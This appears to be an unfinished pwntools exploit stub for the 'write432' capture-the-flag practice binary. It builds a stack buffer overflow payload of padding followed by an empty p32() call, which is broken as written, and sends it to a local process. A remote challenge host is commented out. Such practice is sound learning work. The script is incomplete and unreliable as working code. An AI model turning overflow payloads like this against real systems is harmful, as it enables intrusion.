from pwn import * 
from pwn import p32
import socket
from ctypes import *
context(arch='i386',os = 'linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libwrite432.so')
r = process("./write432")

payload = b'A'* 0x28 + p32()

pause()

r.sendlineafter(b">", payload)

r.interactive()
